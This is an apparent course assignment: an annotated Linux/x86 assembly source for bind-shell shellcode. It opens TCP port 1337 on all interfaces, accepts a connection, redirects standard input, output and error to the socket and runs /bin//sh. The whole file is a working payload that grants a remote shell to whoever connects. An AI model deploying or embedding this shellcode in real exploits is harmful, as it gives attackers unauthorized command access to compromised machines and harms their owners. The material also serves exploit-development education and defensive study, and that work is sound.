; SLAE - Assignment #1: Shell Bind TCP Shellcode (Linux/x86)
; Author:  Julien Ahrens (@MrTuxracer)
; Website:  http://www.rcesecurity.com

global _start			

section .text
_start:
	;
	; int socketcall(int call, unsigned long *args);
	; sockfd = socket(int socket_family, int socket_type, int protocol);
	;
	push 0x66 
	pop eax ;syscall: sys_socketcall + cleanup eax register
	
	push 0x1
	pop ebx ;sys_socket (0x1) + cleanup ebx register

	xor esi, esi ;cleanup esi register

	push esi ;protocol=IPPROTO_IP (0x0)
	push ebx ;socket_type=SOCK_STREAM (0x1)
	push 0x2 ;socket_family=AF_INET (0x2)

	mov ecx, esp ;save pointer to socket() args

	int 0x80 ;exec sys_socket

	pop edi ;cleanup register for xchg

	xchg edi, eax; save result (sockfd) for later usage

	;
	; int socketcall(int call, unsigned long *args);
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	;
	xchg ebx, eax ;sys_bind (0x2)
	mov al, 0x66 ;syscall: sys_socketcall

	;struct sockaddr_in {
	;  __kernel_sa_family_t  sin_family;     /* Address family               */
	;  __be16                sin_port;       /* Port number                  */
	;  struct in_addr        sin_addr;       /* Internet address             */
	;};
	
	push esi         ;sin_addr=0 (INADDR_ANY)
	push word 0x3905 ;sin_port=1337 (network byte order)
	push word bx     ;sin_family=AF_INET (0x2)
	mov ecx, esp     ;save pointer to sockaddr_in struct

	push 0x10 ;addrlen=16
	push ecx  ;struct sockaddr pointer
	push edi  ;sockfd

	mov ecx, esp ;save pointer to bind() args
	
	int 0x80 ;exec sys_bind

	;
	; int socketcall(int call, unsigned long *args);
	; int listen(int sockfd, int backlog);
	;
	mov al, 0x66 ;syscall 102 (sys_socketcall)
	mov bl, 0x4  ;sys_listen

	push esi ;backlog=0
	push edi ;sockfd

	mov ecx, esp ;save pointer to listen() args

	int 0x80 ;exec sys_listen

	;
	; int socketcall(int call, unsigned long *args);
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	;	
	mov al, 0x66 ;syscall: sys_socketcall
	inc ebx      ;sys_accept (0x5) 

	push esi ;addrlen=0
	push esi ;addr=0
	push edi ;sockfd	

	mov ecx, esp ;save pointer to accept() args

	int 0x80 ;exec sys_accept

	;
	; int socketcall(int call, unsigned long *args);
	; int dup2(int oldfd, int newfd);
	;
	pop ecx ;dummy-pop to get to the next 0x0
	pop ecx ;make sure that ecx contains 0x0 to get the next mov working (sockfd might be greater that 0xFF)
	mov cl, 0x2 ;initiate counter

	xchg ebx,eax ;save clientfd 
; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
loop:
	mov al, 0x3f ;syscall: sys_dup2 
	int 0x80     ;exec sys_dup2
	dec ecx	     ;decrement loop-counter
	jns loop     ;as long as SF is not set -> jmp to loop

	;
	; int execve(const char *filename, char *const argv[],char *const envp[]);
	;
	mov al, 0x0b ;syscall: sys_execve

	;terminating NULL is already on the stack
	push 0x68732f2f	;"hs//"
	push 0x6e69622f	;"nib/"

	mov ebx, esp ;save pointer to filename

	inc ecx      ;argv=0, ecx is 0xffffffff (+SF is set)
	mov edx, ecx ;make sure edx contains 0

	int 0x80 ; exec sys_execve
